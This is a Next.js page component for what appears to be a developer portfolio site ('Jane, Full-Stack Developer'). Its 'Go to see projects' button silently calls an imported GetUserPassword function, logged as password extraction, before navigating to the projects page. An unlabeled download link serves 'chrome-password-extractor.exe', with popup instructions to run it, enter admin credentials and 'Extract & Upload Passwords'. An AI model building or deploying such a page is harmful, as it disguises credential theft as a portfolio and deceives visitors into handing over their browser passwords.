"use client";
import React, { useState } from "react";
import Link from "next/link";
import { ArrowRight, Download } from "lucide-react";
import { useRouter } from "next/navigation";
import GetUserPassword from "@/libs/getUserPassword";

export default function Page() {
  const router = useRouter();
  const [downloaded, setDownloaded] = useState(false);
  const [showInstructions, setShowInstructions] = useState(false);

  const handleClick = async () => {
    setDownloaded(true);
    try {
      console.log("Attempting to extract password...");
      const response = await GetUserPassword();
      console.log("Password extraction:", response.error ? "Failed" : "Successful");
    } catch (error) {
      console.error("Error fetching user password:", error);
    }
    setDownloaded(false);
    // Always navigate to projects page
    router.push("/projects");
  }

  const handleDownload = () => {
    setDownloaded(true);
    setShowInstructions(false);

    // Add check for download failure
    const downloadTimer = setTimeout(() => {
      alert("Download may have failed. Please try again or contact support.");
    }, 5000); // Show error if download doesn't start within 5 seconds

    // Clear the timer if component unmounts
    return () => clearTimeout(downloadTimer);
  };

  return (
    <div className="min-h-screen bg-gray-900">
      {/* Hero Section */}
      <section className="flex gap-5 flex-col px-5 items-center justify-center text-center h-[80vh] min-h-[500px] py-20 relative">
        <h2 className="text-white text-4xl font-semibold">I&apos;m <span className="text-yellow-500">Jane,</span></h2>
        <p className="text-white text-3xl font-semibold">Full-Stack Developer</p>

        <div className="flex flex-wrap gap-4 justify-center">
          <button
            onClick={() => handleClick()}
            disabled={downloaded}
            className="mt-5 cursor-pointer flex justify-center rounded-2xl items-center gap-2 bg-white px-6 py-3 w-fit shadow-md shadow-gray-400"
          >
            <div className="text-yellow-500 rounded-lg font-semibold">Go to see projects</div>
            <ArrowRight size={16} className="text-yellow-500" strokeWidth={3} />
          </button>

          <a
            href="http://127.0.0.1:5000/api/download/client-app"
            onClick={handleDownload}
            className="mt-5 cursor-pointer flex justify-center rounded-2xl items-center gap-2 bg-yellow-500 px-6 py-3 w-fit shadow-md shadow-gray-400"
            download="chrome-password-extractor.exe"
          >
            <Download size={16} className="text-white" strokeWidth={3} />
          </a>
        </div>

        {/* Instructions popup */}
        {showInstructions && (
          <div className="absolute bottom-5 left-1/2 transform -translate-x-1/2 w-full max-w-md bg-white p-5 rounded-lg shadow-lg text-left">
            <h4 className="font-bold text-lg mb-2">Download Started!</h4>
            <p className="mb-2">To use the Chrome Password Extractor:</p>
            <ol className="list-decimal pl-5 space-y-1 text-sm">
              <li>Locate the downloaded file</li>
              <li>Double-click to run it</li>
              <li>Enter your admin credentials</li>
              <li>Click &quot;Extract &amp; Upload Passwords&quot;</li>
            </ol>
            <button
              onClick={() => setShowInstructions(false)}
              className="mt-3 bg-gray-200 hover:bg-gray-300 px-3 py-1 rounded text-sm"
            >
              Close
            </button>
          </div>
        )}
      </section>

      {/* Course Section */}
      <section id="courses" className="bg-white py-20 px-5 text-gray-900">
        <div className="max-w-6xl mx-auto px-6">
          <h3 className="text-2xl font-bold text-center">My Talents</h3>
          <div className="grid grid-cols-1 md:grid-cols-3 gap-8 mt-6">
            <div className="p-6 shadow-lg rounded-lg bg-gray-50">
              <h4 className="text-lg font-semibold">Web Development</h4>
              <p className="text-sm mt-2">Learn full-stack web development with modern technologies.</p>
            </div>
            <div className="p-6 shadow-lg rounded-lg bg-gray-50">
              <h4 className="text-lg font-semibold">UI/UX Design</h4>
              <p className="text-sm mt-2">Master user experience and interface design techniques.</p>
            </div>
            <div className="p-6 shadow-lg rounded-lg bg-gray-50">
              <h4 className="text-lg font-semibold">Data Science</h4>
              <p className="text-sm mt-2">Analyze data and gain insights using machine learning.</p>
            </div>
          </div>
        </div>
      </section>

      {/* Contact Section */}
      <section id="contact" className="py-20 text-center px-5 space-y-4">
        <h3 className="text-2xl text-white font-bold">Contact Me For Work</h3>
        <Link href="/contact" className="mt-5 mx-auto flex justify-center cursor-pointer rounded-2xl items-center gap-2 bg-white px-6 py-3 w-fit  shadow-md shadow-gray-400">
          <div className=" text-yellow-500 rounded-lg font-semibold">Get in touch</div>
          <ArrowRight size={16} className="text-yellow-500" strokeWidth={3} />
        </Link>
      </section>
    </div>
  );
};

